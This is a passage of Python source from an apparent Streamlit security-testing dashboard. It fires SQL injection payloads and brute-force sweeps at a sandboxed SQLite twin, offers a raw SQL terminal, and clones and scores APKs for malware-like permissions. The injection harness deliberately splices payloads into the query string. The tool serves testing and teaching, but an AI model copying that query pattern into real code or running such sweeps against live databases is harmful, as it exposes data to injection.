                f'color:#A7F3D0;border-radius:5px;font-size:0.66rem;line-height:1.5;'
                f'max-height:160px;overflow:auto;white-space:pre-wrap;'
                f'word-break:break-word">{entry["out"][:1500]}</pre>'
                f'</div>'
            )


def _run_single_sqli_payload(db_path: str, pid: str, label: str,
                              payload: str, signal: str, state: dict) -> None:
    """Execute one SQLi payload, record outcome."""
    import sqlite3, time
    t0 = time.time()
    # Wrap as a typical login query template
    sql = f"SELECT id, username FROM users WHERE username = '{payload}'"
    try:
        con = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
        rows = con.execute(sql).fetchall()
        ms = (time.time() - t0) * 1000
        success = len(rows) > 0 or signal in ("schema_leaked", "credential_leak")
        out = "\n".join([" | ".join(str(c) for c in r) for r in rows[:50]])
        con.close()
    except Exception as e:
        ms = (time.time() - t0) * 1000
        success = False
        rows = []
        out = f"sqlite3 error: {e}"
    state[f"sqli_result_{pid}"] = {
        "label":   label,
        "payload": payload,
        "rows":    len(rows),
        "ms":      ms,
        "success": success,
        "out":     out,
    }
    st.toast(("✓ payload landed" if success else "✗ payload rejected") +
              f" · {len(rows)} row(s) · {ms:.0f}ms",
              icon=("✅" if success else "⚠"))


def _run_brute_force(db_path: str, attempts: int, state: dict) -> None:
    """Fire N SQLi attempts, track aggregate stats per category."""
    import sqlite3, time, random
    all_payloads = []
    for cat, lst in _SQLI_PAYLOADS.items():
        for pid, label, payload, signal, _ in lst:
            all_payloads.append((cat, pid, label, payload, signal))

    progress = st.progress(0.0, text=f"Firing 0 / {attempts} payloads…")
    summary = {cat: {"fired": 0, "hits": 0, "ms_total": 0.0}
                for cat in _SQLI_PAYLOADS}
    detail = []
    con = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
    t_start = time.time()
    for i in range(attempts):
        cat, pid, label, payload, signal = random.choice(all_payloads)
        sql = f"SELECT id, username FROM users WHERE username = '{payload}'"
        t0 = time.time()
        try:
            rows = con.execute(sql).fetchall()
            row_n = len(rows)
            ok = row_n > 0 or signal in ("schema_leaked", "credential_leak")
        except Exception:
            row_n = 0; ok = False
        ms = (time.time() - t0) * 1000
        summary[cat]["fired"] += 1
        summary[cat]["ms_total"] += ms
        if ok:
            summary[cat]["hits"] += 1
        detail.append({"cat": cat, "label": label, "ok": ok,
                        "rows": row_n, "ms": ms})
        # Update progress every 10% to avoid Streamlit spam
        if (i + 1) % max(1, attempts // 20) == 0 or i == attempts - 1:
            progress.progress((i + 1) / attempts,
                              text=f"Firing {i+1} / {attempts} payloads…")
    con.close()
    elapsed = time.time() - t_start
    progress.empty()
    state["sqli_brute_result"] = {
        "attempts":  attempts,
        "elapsed_s": elapsed,
        "summary":   summary,
        "detail":    detail[-50:],   # last 50 individual hits
    }
    st.toast(f"✓ Brute force complete · {attempts} payloads · {elapsed:.1f}s",
              icon="⚡")


def _render_brute_force_report(rep: dict) -> None:
    """Stats card for the last brute-force run."""
    total_fired = sum(s["fired"] for s in rep["summary"].values())
    total_hits  = sum(s["hits"]  for s in rep["summary"].values())
    hit_pct = (total_hits / total_fired * 100) if total_fired else 0
    accent = "#DC2626" if hit_pct > 30 else ("#D97706" if hit_pct > 10 else "#16A34A")

    # Overall KPIs
    st.html(
        f'<div style="background:#FFFFFF;border:1.5px solid {accent}55;'
        f'border-left:4px solid {accent};border-radius:10px;padding:11px 14px;'
        f'margin-top:9px;box-shadow:0 2px 10px -5px {accent}44">'
        f'<div style="display:flex;align-items:center;justify-content:space-between;'
        f'gap:10px;margin-bottom:9px">'
        f'<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
        f'color:{accent};letter-spacing:0.02em">'
        f'⚡ BRUTE-FORCE REPORT · {rep["attempts"]} attempts · {rep["elapsed_s"]:.1f}s'
        f'</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
        f'font-weight:700;color:{accent};background:{accent}14;'
        f'border:1px solid {accent}66;border-radius:5px;padding:3px 9px">'
        f'{hit_pct:.1f}% hit rate</span>'
        f'</div>'
        f'<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px">'
        + "".join(
            f'<div style="background:{_CATEGORY_META[cat]["bg"]};'
            f'border:1px solid {_CATEGORY_META[cat]["border"]};border-radius:7px;'
            f'padding:9px 11px">'
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.6rem;'
            f'font-weight:700;color:{_CATEGORY_META[cat]["color"]};'
            f'letter-spacing:0.1em">{_CATEGORY_META[cat]["label"]}</div>'
            f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.4rem;'
            f'font-weight:800;color:{_CATEGORY_META[cat]["color"]};line-height:1;'
            f'margin-top:5px">{s["hits"]}/{s["fired"]}</div>'
            f'<div style="font-family:JetBrains Mono,monospace;font-size:0.58rem;'
            f'color:#475569;margin-top:3px">'
            f'avg {(s["ms_total"]/max(s["fired"],1)):.1f}ms · '
            f'{(s["hits"]/max(s["fired"],1)*100):.0f}% hit'
            f'</div>'
            f'</div>'
            for cat, s in rep["summary"].items()
        )
        + '</div></div>'
    )


def _exec_cmd_terminal(db_path: str, sql: str, write_mode: bool,
                        state: dict) -> None:
    """Execute one command in the CMD-style terminal, append to history."""
    import sqlite3, time
    sql = sql.strip().rstrip(";")
    if not sql:
        st.toast("empty input", icon="ℹ")
        return
    t0 = time.time()
    try:
        mode = "rw" if write_mode else "ro"
        con = sqlite3.connect(f"file:{db_path}?mode={mode}", uri=True)
        cur = con.execute(sql)
        stmt = sql.split()[0].upper()
        if stmt == "SELECT":
            rows = cur.fetchall()
            cols = [d[0] for d in (cur.description or [])]
            out = (" | ".join(cols) + "\n" +
                    "\n".join(" | ".join(str(c) for c in r)
                              for r in rows[:200]))
            row_n = len(rows)
        else:
            if write_mode:
                con.commit()
            out = f"{stmt} executed · {cur.rowcount} row(s) affected"
            row_n = cur.rowcount
        ok = True
        con.close()
    except Exception as e:
        out = f"sqlite3 error: {e}"
        row_n = 0; ok = False
    ms = (time.time() - t0) * 1000
    hist = state.get("sqli_cmd_history") or []
    hist.insert(0, {"t": sql[:160], "out": out, "ok": ok,
                     "rows": row_n, "ms": ms})
    state["sqli_cmd_history"] = hist[:50]
    state["sqli_cmd_last"] = sql
    st.toast(("✓ " if ok else "✗ ") +
              f"{row_n} row(s) · {ms:.0f}ms",
              icon=("✅" if ok else "⚠"))

    log = state.get("db_attack_log", [])
    if log:
        st.markdown("<div style='height:8px'></div>", unsafe_allow_html=True)
        st.markdown(
            '<div style="font-family:JetBrains Mono,monospace;font-size:.62rem;font-weight:700;'
            'color:#0284C7;letter-spacing:.14em;text-transform:uppercase;margin-bottom:8px">'
            '▸ Live attack console</div>',
            unsafe_allow_html=True,
        )
        st.markdown(
            '<div style="background:#FFFFFF;border:1px solid #E0F2FE;border-radius:10px;'
            'padding:12px;max-height:540px;overflow:auto;box-shadow:inset 0 -8px 12px -10px rgba(2,132,199,0.2)">'
            + "".join(_db_attack_event_html(m) for m in log[-50:])
            + "</div>",
            unsafe_allow_html=True,
        )
        if st.button("Clear attack console", key="dba_clear"):
            state["db_attack_log"] = []
            st.rerun()


def _run_db_attack(attack_key: str, state: dict, result: dict) -> None:
    """Stream the real attack into the console with live terminal for 30-pattern suite."""
    from core.database_attack_lab import run_db_attack, ATTACKS
    spec = ATTACKS.get(attack_key, {})
    state["db_attack_log"] = []
    use_pcap = attack_key == "sqli_30_patterns"

    if use_pcap:
        st.markdown(_PCAP_CSS, unsafe_allow_html=True)
        st.markdown(
            f'<div style="font-family:JetBrains Mono,monospace;font-size:.62rem;color:#A78BFA;'
            f'letter-spacing:.12em;margin-bottom:4px">▸ 30-PATTERN SQLi SWEEP — LIVE DB CONSOLE</div>',
            unsafe_allow_html=True,
        )
        term = st.empty()
        term_rows: list[str] = []

        def _db_pcap_row(ev: dict) -> str:
            st_val = ev.get("status", "info")
            if st_val == "crit":
                color, verdict = "#F87171", "INJECTED"
            elif st_val == "ok":
                color, verdict = "#4ADE80", "BLOCKED"
            elif st_val == "warn":
                color, verdict = "#FBBF24", "ERROR LEAK"
            else:
                color, verdict = "#60A5FA", "INFO"
            sql = ev.get("sql", "")
            sql_part = f'<span style="color:#C084FC;font-size:.62rem">{sql[:80].replace("<","&lt;")}</span> ' if sql else ""
            text_safe = (ev.get("text","") or "").replace("<","&lt;").replace(">","&gt;")[:200]
            return (
                f'<div class="las-row">'
                f'{sql_part}'
                f'<span style="color:{color};font-weight:700;font-size:.64rem">'
                f'◉ {verdict}</span>'
                f'<span style="color:#94A3B8;font-size:.6rem;margin-left:8px">{text_safe[:120]}</span>'
                f'</div>'
            )

        try:
            for ev in run_db_attack(state["db_path"], result.get("url", ""), attack_key):
                state["db_attack_log"].append(ev)
                term_rows.append(_db_pcap_row(ev))
                disp = term_rows[-50:]
                term.markdown(
                    f'<div class="las-term" style="max-height:380px;overflow-y:auto">'
                    f'{"".join(disp)}'
                    f'<div class="las-blink las-req">█</div></div>',
                    unsafe_allow_html=True,
                )
                time.sleep(0.06)

            # Final summary row
            log = state["db_attack_log"]
            crits = sum(1 for e in log if e.get("status") == "crit")
            summary_color = "#F87171" if crits else "#4ADE80"
            term_rows.append(
                f'<div class="las-row" style="color:{summary_color};margin-top:6px">'
                f'▸ SCAN COMPLETE — {crits} injections executed · '
                f'{"VULNERABLE" if crits else "SECURED"}</div>'
            )
            term.markdown(
                f'<div class="las-term" style="max-height:380px;overflow-y:auto">'
                f'{"".join(term_rows[-60:])}</div>',
                unsafe_allow_html=True,
            )
        except Exception as e:
            st.error(f"Attack errored: {e}")
    else:
        with st.status(f"🧬 {spec.get('label','attack')} — running on live twin…",
                       expanded=True) as status:
            try:
                for ev in run_db_attack(state["db_path"], result.get("url", ""), attack_key):
                    state["db_attack_log"].append(ev)
                    st.markdown(_db_attack_event_html(ev), unsafe_allow_html=True)
                    time.sleep(0.18)
                status.update(label=f"✓ {spec.get('label','attack')} — original DB untouched",
                              state="complete", expanded=False)
            except Exception as e:
                st.error(f"Attack errored: {e}")
                status.update(label=f"⚠ {spec.get('label','attack')} — error", state="error")
    st.rerun()


def _clone_apk_to_docker(wb: dict):
    """
    Spin up a Docker container with the extracted APK sandbox files + Python HTTP server.
    The APK is already unpacked into wb["sandbox"] by build_apk_workbench().
    Returns a result dict (same shape as source_clone results) or an error string.
    """
    import tarfile, io as _io, socket, time as _t
    try:
        import docker as _dk
        client = _dk.from_env(timeout=10)
    except Exception as e:
        return f"Docker unavailable: {e}"

    sandbox = wb.get("sandbox", "")
    apk_id  = wb.get("apk_id", "apk_" + secrets.token_hex(3))

    # clone_id = "apk_<apk_id>" so _get_container() tries aidtctm_apk_<apk_id> first
    clone_id       = f"apk_{apk_id}"
    container_name = f"aidtctm_{clone_id}"

    # Free host port
    with socket.socket() as _s:
        _s.bind(("", 0))
        port = _s.getsockname()[1]

    try:
        # Remove stale container if present
        try:
            client.containers.get(container_name).remove(force=True)
        except Exception:
            pass

        # Start container — python HTTP server serves /apk_twin at port 8080
        container = client.containers.run(
            "python:3.11-slim",
            command=["sh", "-c",
                     "mkdir -p /apk_twin && "
                     "python3 -m http.server 8080 --directory /apk_twin"],
            name=container_name,
            detach=True,
            ports={"8080/tcp": port},
            labels={"aidtctm": "apk_twin", "apk_id": apk_id},
            mem_limit="512m",
            nano_cpus=500_000_000,
        )

        # Copy extracted APK files into /apk_twin in container
        if sandbox and os.path.isdir(sandbox):
            buf = _io.BytesIO()
            with tarfile.open(fileobj=buf, mode="w") as tar:
                tar.add(sandbox, arcname="apk_twin")
            buf.seek(0)
            container.put_archive("/", buf.read())

        _t.sleep(1.5)
        container.reload()

        return {
            "clone_id":       clone_id,
            "container_name": container_name,
            "url":            f"http://localhost:{port}",
            "host_port":      str(port),
            "stack": {
                "language":  "android",
                "framework": "apk-twin",
                "copy_dest": "/apk_twin",
            },
            "ready":    True,
            "apk_id":   apk_id,
        }
    except Exception as e:
        return f"Docker clone failed: {e}"


def _destroy_apk_clone(container_name: str) -> None:
    try:
        import docker as _dk
        _dk.from_env(timeout=5).containers.get(container_name).remove(force=True)
    except Exception:
        pass


def _render_apk_install_walkthrough(report: dict, sev: str, sev_color: str) -> None:
    """v30: simulated step-by-step Android install timeline.

    Uses REAL APK metadata (package, permissions, components, suspicious
    strings) to render what would happen on a real device if the user
    tapped Install. No emulator needed — pure visual walkthrough so a
    viva audience can SEE the install consequences without 3GB redroid.
    """
    md      = report.get("metadata", {}) or {}
    perms   = report.get("all_permissions", []) or []
    danger  = report.get("permissions", []) or []
    combos  = report.get("permission_combos", []) or []
    susp    = report.get("suspicious_strings", []) or []
    comps   = report.get("components", {}) or {}
    activities = comps.get("activities", []) or []
    services   = comps.get("services", []) or []
    receivers  = comps.get("receivers", []) or []

    is_warn = sev in ("CRITICAL", "HIGH")
    pkg     = md.get("package", md.get("package_name", "unknown.package"))
    app_nm  = md.get("app_name") or pkg.split(".")[-1].title()
    pkg_esc = str(pkg).replace("<", "&lt;")
    nm_esc  = str(app_nm).replace("<", "&lt;")[:32]

    # Build the 6 stages
    stages = [
        {
            "icon": "📥", "title": "APK PARSE",
            "body": f"Android PackageManager reads <code>AndroidManifest.xml</code> · "
                    f"package <b>{pkg_esc}</b> · "
                    f"version <b>{md.get('version_name', md.get('version','?'))}</b> · "
                    f"min SDK <b>{md.get('min_sdk','?')}</b>",
            "status": "ok",
        },
        {
            "icon": "🔐", "title": "PERMISSION REQUESTS",
            "body": (
                f"<b>{len(perms)}</b> total perms requested · "
                f"<b style='color:#DC2626'>{len(danger)}</b> dangerous "
                f"({', '.join([(p.get('name','') if isinstance(p, dict) else str(p)).split('.')[-1] for p in danger[:5]]) or 'none'})"
                + ("<br><b style='color:#DC2626'>⚠ Android would show install-time consent dialog for each dangerous perm</b>"
                    if danger else "")
            ),
            "status": "warn" if danger else "ok",
        },
        {
            "icon": "🚨", "title": "MALWARE-COMBO CHECK",
            "body": (
                f"<b style='color:#DC2626'>{len(combos)} dangerous combos detected</b>"
                + (": " + " · ".join(
                    c.get("name", "?") if isinstance(c, dict) else str(c)
                    for c in combos[:3]) if combos else
                  " — no known surveillance/spyware permission shapes")
            ),
            "status": "crit" if combos else "ok",
        },
        {
            "icon": "🧩", "title": "COMPONENTS REGISTER",
            "body": (
                f"<b>{len(activities)}</b> activities · "
                f"<b>{len(services)}</b> background services · "
                f"<b>{len(receivers)}</b> broadcast receivers"
                + ("<br><i>Boot receivers fire on BOOT_COMPLETED — persistence vector</i>"
                    if any('boot' in str(r).lower() for r in receivers) else "")
            ),
            "status": "warn" if (len(services) > 5 or any('boot' in str(r).lower() for r in receivers)) else "ok",
        },
        {
            "icon": "🌐", "title": "EMBEDDED SECRETS / URLs",
            "body": (
                f"<b>{len(susp)} suspicious strings</b> found in DEX bytecode"
                + (": " + " · ".join(
                    str(s.get("value", s) if isinstance(s, dict) else s)[:40]
                    for s in susp[:3]) if susp else
                  " — clean string table")
            ),
            "status": "warn" if susp else "ok",
        },
        {
            "icon": "🛡" if not is_warn else "🚫",
            "title": "FINAL VERDICT — INSTALL DECISION",
            "body": (
                f"<b style='color:{sev_color}'>{sev}</b> · risk {report.get('score', 0)}/10 "
                "&middot; "
                + (
                    "<span style='color:#DC2626'>Google Play Protect would BLOCK · "
                    "user-side install required SIDELOADING (Unknown Sources enabled).</span>"
                    if is_warn else
                    "<span style='color:#16A34A'>passes structural checks · "
                    "would install normally via Play Store policy.</span>"
                )
            ),
            "status": "crit" if is_warn else "ok",
        },
    ]

    _STATUS_COLOR = {
        "ok":   ("#16A34A", "#F0FDF4", "#BBF7D0"),
        "warn": ("#D97706", "#FFFBEB", "#FDE68A"),
        "crit": ("#DC2626", "#FEF2F2", "#FECACA"),
    }

    rows_html = ""
    for i, st_ in enumerate(stages, start=1):
        sc, sbg, sbd = _STATUS_COLOR[st_["status"]]
        rows_html += (
            f'<div style="display:grid;grid-template-columns:48px 1fr;gap:14px;'
            f'padding:11px 14px;background:{sbg};border:1px solid {sbd};'
            f'border-left:4px solid {sc};border-radius:8px;margin-bottom:7px;'
            f'position:relative">'
            # Timeline number badge
            f'<div style="background:#FFFFFF;border:2px solid {sc};'
            f'border-radius:50%;width:38px;height:38px;display:flex;'
            f'align-items:center;justify-content:center;font-size:1.0rem;'
            f'box-shadow:0 2px 6px -2px {sc}44">{st_["icon"]}</div>'
            f'<div>'
            f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:3px">'
            f'<span style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
            f'font-weight:700;color:{sc};background:#FFFFFF;border:1px solid {sbd};'
            f'border-radius:5px;padding:2px 7px;letter-spacing:0.1em">'
            f'STEP {i}/6</span>'
            f'<span style="font-family:Inter,sans-serif;font-size:0.82rem;'
            f'font-weight:700;color:{sc};letter-spacing:0.02em">{st_["title"]}</span>'
            f'</div>'
            f'<div style="font-family:Inter,sans-serif;font-size:0.7rem;'
            f'color:#374151;line-height:1.55">{st_["body"]}</div>'
            f'</div>'
            f'</div>'
        )

    st.html(
        '<style>'
        '@keyframes apk-step-glow{0%,100%{opacity:1}50%{opacity:0.78}}'
        '</style>'
        '<div style="background:linear-gradient(135deg,#F8FAFC,#F1F5F9);'
        'border:1.5px solid #CBD5E1;border-radius:12px;padding:14px 16px;'
        'margin:14px 0 10px;'
        'box-shadow:inset 0 1px 0 rgba(255,255,255,0.6),0 4px 14px -8px rgba(15,23,42,0.18)">'
        '<div style="display:flex;align-items:center;justify-content:space-between;'
        'gap:10px;margin-bottom:11px">'
        '<div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.92rem;font-weight:700;'
        'color:#0F172A;letter-spacing:0.02em">'
        '📱 SIMULATED INSTALL WALKTHROUGH'
        '</div>'
        '<div style="font-family:Inter,sans-serif;font-size:0.66rem;color:#475569;'
        f'margin-top:2px">'
        f'What Android would do step-by-step if you sideloaded <b>{nm_esc}</b> · '
        f'real-device behavior, no emulator needed.'
        '</div>'
        '</div>'
        f'<span style="font-family:JetBrains Mono,monospace;font-size:0.58rem;'
        f'font-weight:700;color:{sev_color};background:#FFFFFF;border:1.5px solid {sev_color}66;'
        f'padding:4px 10px;border-radius:6px;letter-spacing:0.1em;'
        f'animation:apk-step-glow 1.8s ease-in-out infinite">'
        f'{sev}</span>'
        '</div>'
        + rows_html +
        '<div style="font-family:Inter,sans-serif;font-size:0.62rem;color:#94A3B8;'
        'font-style:italic;margin-top:8px;text-align:center">'
        'Timeline uses REAL APK metadata — package, permissions, components, embedded '
        'strings — to project install-time + runtime behavior on a real Android device.'
        '</div>'
        '</div>'
    )


def _render_apk_view(state: dict) -> None:
    """Static APK forensic report — verdict, permissions, combos, secrets."""
    report = state.get("report", {})
    if report.get("status") != "complete":
        st.error(f"APK analysis failed: {report.get('error', 'unknown error')}")
        if st.button("← Analyze another APK", key="apk_reset"):
            st.session_state.pop("dt_state", None)
            st.rerun()
        return

    md = report.get("metadata", {})
    sev = report.get("severity", "CLEAN")
    score = report.get("score", 0)
    sev_color = {"CRITICAL": "#DC2626", "HIGH": "#EA580C", "MEDIUM": "#D97706",
                 "LOW": "#16A34A", "CLEAN": "#16A34A"}.get(sev, "#64748B")
    sev_bg = {"CRITICAL": "rgba(220,38,38,0.08)", "HIGH": "rgba(234,88,12,0.08)",
              "MEDIUM": "rgba(217,119,6,0.08)", "LOW": "rgba(22,163,74,0.08)",
              "CLEAN": "rgba(22,163,74,0.08)"}.get(sev, "rgba(100,116,139,0.08)")

    status_badge = (f'<span class="dt-pro-badge crit"><span class="dot"></span>{sev}</span>'
                    if sev in ("CRITICAL", "HIGH") else
                    f'<span class="dt-pro-badge live"><span class="dot"></span>{sev}</span>')
    st.markdown(_sec_header("attack", "APK Analysis", status_badge), unsafe_allow_html=True)

    # Verdict banner
    st.markdown(
        f'<div style="background:{sev_bg};border:1px solid {sev_color}44;border-left:4px solid {sev_color};'
        f'border-radius:12px;padding:16px 20px;margin-bottom:16px;">'
        f'<div style="display:flex;justify-content:space-between;align-items:center;">'
        f'<div><span style="font-family:Poppins,sans-serif;font-size:1.2rem;font-weight:800;color:{sev_color};">{sev}</span>'
        f'<span style="font-family:Inter;font-size:0.8rem;color:#475569;margin-left:12px;">risk {score}/10</span></div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#64748B;">{md.get("engine","")}</div>'
        f'</div>'
        f'<div style="font-family:Inter;font-size:0.82rem;color:#0C4A6E;margin-top:6px;">{report.get("summary","")}</div>'
        f'</div>',
        unsafe_allow_html=True,
    )

    # v34-fix: hoist these out of the original location (line ~1694)
    # so the v29 phone-frame card below can reference them.
    # Original locations now noop-reassign — Python is fine with that.
    perms  = report.get("all_permissions", [])
    danger = report.get("permissions", [])
    combos = report.get("permission_combos", [])
    susp   = report.get("suspicious_strings", [])

    # ── v29: PHONE-FRAME VISUAL CARD (iframe-equivalent for APK) ─────
    # Same shape as the LIVE CLONE iframe in code-clone mode: a visual
    # surrogate of the running app. Since APKs can't render in browser,
    # we draw a stylised phone frame containing the app metadata, lock-
    # screen-style alert if dangerous, and a clean lock if safe.
    _is_warning = sev in ("CRITICAL", "HIGH")
    _phone_bg   = "#7F1D1D" if _is_warning else "#14532D"
    _phone_chip = "⚠ WARNING — DO NOT INSTALL" if _is_warning else "✅ SAFE — SCAN PASSED"
    _phone_chip_bg = "#DC2626" if _is_warning else "#16A34A"
    _pkg = md.get("package", md.get("package_name", "unknown.package"))
    _app_name = md.get("app_name", _pkg.split(".")[-1].title() or "App")
    _version = md.get("version_name", md.get("version", "?"))
    _esc_pkg = str(_pkg).replace("<","&lt;").replace(">","&gt;")
    _esc_name = str(_app_name).replace("<","&lt;").replace(">","&gt;")[:24]
    _esc_ver  = str(_version).replace("<","&lt;").replace(">","&gt;")

    # Top 3 dangerous-permission badges shown on the phone screen
    _perm_chips = ""
    for _p in (danger or [])[:3]:
        _pname = (_p.get("name", "") if isinstance(_p, dict) else str(_p)).split(".")[-1]
        _perm_chips += (
            f'<div style="background:rgba(255,255,255,0.12);border:1px solid '
            f'rgba(255,255,255,0.18);border-radius:5px;padding:4px 9px;'
            f'font-family:JetBrains Mono,monospace;font-size:0.55rem;'
            f'color:#FECACA;margin-bottom:4px">{_pname}</div>'
        )
    if not _perm_chips:
        _perm_chips = (
            '<div style="background:rgba(255,255,255,0.10);border:1px dashed '
            'rgba(255,255,255,0.25);border-radius:5px;padding:6px 10px;'
            'font-family:Inter,sans-serif;font-size:0.6rem;color:#BBF7D0;text-align:center">'
            'No dangerous permissions requested</div>'
        )

    st.html(
        '<style>'
        '@keyframes apk-pulse { 0%,100%{box-shadow:0 0 0 0 ' + _phone_chip_bg + 'aa} '
        '50%{box-shadow:0 0 0 8px ' + _phone_chip_bg + '00} }'
        '.apk-status-dot{animation:apk-pulse 1.4s ease-in-out infinite;'
        'width:8px;height:8px;border-radius:50%;background:' + _phone_chip_bg + ';'
        'display:inline-block;flex-shrink:0}'
        '</style>'
        '<div style="display:grid;grid-template-columns:auto 1fr;gap:16px;margin-bottom:16px;'
        'align-items:stretch">'
        # LEFT — stylised mobile-phone frame
        '<div style="background:#0F172A;border:8px solid #1E293B;border-radius:28px;'
        'padding:0;width:240px;box-shadow:0 8px 24px -8px rgba(15,23,42,0.4),'
        'inset 0 0 0 2px #334155;position:relative;overflow:hidden">'
        # Phone notch
        '<div style="background:#0F172A;height:18px;display:flex;justify-content:center;'
        'align-items:center"><div style="background:#1E293B;width:80px;height:14px;'
        'border-radius:0 0 10px 10px"></div></div>'
        # Status bar
        '<div style="background:' + _phone_bg + ';padding:5px 14px;display:flex;'
        'justify-content:space-between;align-items:center;font-family:Inter,sans-serif;'
        'font-size:0.55rem;color:#FFFFFF;font-weight:700">'
        '<span>9:41</span><span>● ● ●  📶  🔋 92%</span></div>'
        # App icon area
        '<div style="background:' + _phone_bg + ';padding:18px 16px 14px;text-align:center">'
        '<div style="width:62px;height:62px;background:linear-gradient(135deg,#FFFFFF,#E2E8F0);'
        'border-radius:14px;display:flex;align-items:center;justify-content:center;'
        'font-size:1.8rem;margin:0 auto 9px;box-shadow:0 4px 12px -4px rgba(0,0,0,0.4)">📱</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.84rem;font-weight:700;'
        f'color:#FFFFFF;margin-bottom:2px;line-height:1.2">{_esc_name}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:rgba(255,255,255,0.7);word-break:break-all">{_esc_pkg}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        f'color:rgba(255,255,255,0.55);margin-top:2px">v{_esc_ver}</div>'
        '</div>'
        # Verdict strip
        f'<div style="background:{_phone_chip_bg};color:#FFFFFF;font-family:JetBrains Mono,monospace;'
        f'font-size:0.6rem;font-weight:700;padding:6px 12px;text-align:center;'
        f'letter-spacing:0.06em">{_phone_chip}</div>'
        # Permission badges section
        '<div style="background:' + _phone_bg + ';padding:10px 14px 14px;min-height:60px">'
        '<div style="font-family:JetBrains Mono,monospace;font-size:0.55rem;'
        'color:rgba(255,255,255,0.6);letter-spacing:0.12em;font-weight:700;'
        'margin-bottom:5px">REQUESTED PERMISSIONS</div>'
        + _perm_chips +
        '</div>'
        # Phone home-bar
        '<div style="background:#0F172A;padding:7px 0;display:flex;justify-content:center">'
        '<div style="background:#475569;width:80px;height:4px;border-radius:2px"></div></div>'
        '</div>'
        # RIGHT — explanation card matching iframe panel style
        '<div style="background:#FFFFFF;border:1px solid '
        + ('#FCA5A5' if _is_warning else '#86EFAC') + ';border-left:4px solid '
        + _phone_chip_bg + ';border-radius:10px;padding:14px 17px">'
        '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">'
        '<span class="apk-status-dot"></span>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.62rem;font-weight:700;'
        f'color:{_phone_chip_bg};letter-spacing:0.12em">'
        + ('⚠ APK VERDICT — UNSAFE' if _is_warning else '✅ APK VERDICT — SAFE') +
        '</div></div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.78rem;color:#0F172A;'
        f'font-weight:700;margin-bottom:6px">{_esc_name} · risk {score}/10</div>'
        f'<div style="font-family:Inter,sans-serif;font-size:0.68rem;color:#475569;'
        f'line-height:1.55;margin-bottom:8px">'
        + (
            'This APK requests permissions that combined could be used to spy on '
            'the user, exfiltrate data, or persist as malware. <b>Do not install '
            'on a real device.</b> Use the forensic report below to verify the '
            'specific combination of dangerous capabilities.'
            if _is_warning else
            'This APK passed all heuristic checks &mdash; no malicious permission '
            'combinations, no embedded high-risk strings, and a clean component '
            'manifest. Always cross-check with a vendor AV before final approval, '
            'but the structural shape is consistent with legitimate apps.'
          ) +
        '</div>'
        # Quick stats
        '<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:6px;'
        'margin-top:9px">'
        f'<div style="background:#F8FAFC;border:1px solid #E2E8F0;border-radius:6px;'
        f'padding:6px 8px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.05rem;'
        f'font-weight:800;color:#0F172A;line-height:1">{len(perms)}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'color:#64748B;letter-spacing:0.1em;margin-top:1px">PERMS</div></div>'
        f'<div style="background:#FEF2F2;border:1px solid #FECACA;border-radius:6px;'
        f'padding:6px 8px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.05rem;'
        f'font-weight:800;color:#DC2626;line-height:1">{len(danger)}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'color:#7F1D1D;letter-spacing:0.1em;margin-top:1px">DANGER</div></div>'
        f'<div style="background:#FFFBEB;border:1px solid #FDE68A;border-radius:6px;'
        f'padding:6px 8px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.05rem;'
        f'font-weight:800;color:#B45309;line-height:1">{len(combos)}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'color:#92400E;letter-spacing:0.1em;margin-top:1px">COMBOS</div></div>'
        f'<div style="background:#F0F9FF;border:1px solid #BAE6FD;border-radius:6px;'
        f'padding:6px 8px;text-align:center">'
        f'<div style="font-family:Space Grotesk,sans-serif;font-size:1.05rem;'
        f'font-weight:800;color:#0369A1;line-height:1">{len(susp)}</div>'
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.5rem;'
        f'color:#075985;letter-spacing:0.1em;margin-top:1px">SECRETS</div></div>'
        '</div>'
        '</div>'
        '</div>'
    )

    # KPI row
    perms = report.get("all_permissions", [])
    danger = report.get("permissions", [])
    combos = report.get("permission_combos", [])
    susp = report.get("suspicious_strings", [])
    st.markdown(
        '<div class="dt-kpis">'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{len(perms)}</div><div class="dt-kpi-lbl">Permissions</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val" style="color:{"#DC2626" if danger else "#16A34A"}">{len(danger)}</div><div class="dt-kpi-lbl">Dangerous</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val" style="color:{"#DC2626" if combos else "#16A34A"}">{len(combos)}</div><div class="dt-kpi-lbl">Malware Combos</div></div>'
        f'<div class="dt-kpi"><div class="dt-kpi-val">{md.get("dex_count","?")}</div><div class="dt-kpi-lbl">DEX Files</div></div>'
        '</div>',
        unsafe_allow_html=True,
    )

    col_l, col_r = st.columns(2, gap="medium")
    with col_l:
        st.markdown('<div class="dt-tree-hdr">⚠️ Dangerous permissions</div>', unsafe_allow_html=True)
        if danger:
            box = st.container(height=240, border=False)
            with box:
                for p in danger:
